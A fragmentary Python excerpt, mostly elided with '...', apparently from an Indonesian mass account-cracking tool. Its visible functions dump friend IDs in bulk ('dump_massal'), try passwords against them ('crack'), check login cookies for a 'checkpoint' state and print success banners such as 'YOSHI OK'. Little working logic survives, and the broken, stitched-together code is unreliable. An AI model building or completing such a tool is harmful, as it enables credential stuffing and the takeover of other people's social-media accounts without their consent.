...
def banner():
	...
	cetak(nel(pengembang1, title='HANN'))
...
def menu(my_name,my_id,my_birthday):
	...
	print(x+'['+h+'•'+x+'] \033[93mTanggal  : '+str(birth))
...
def dump_massal():
	...
	win2 = mark(win, style='green')
	sol().print(win2)
	print(x+'['+h+'•'+x+'] MASUKKAN JUMLAH ID')
	try:
	...
	yz = 0
	print(x+'['+h+'•'+x+'] Dump ID Dari Teman')
...
def crack(idf,pwv):
	...
	fff = '%'
	print('\r%sYoshi %s/%s <-> OK:%s <-> CP:%s <-> %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					...
					cetak(nel(statusok1, title='YOSHI OK'))
					break
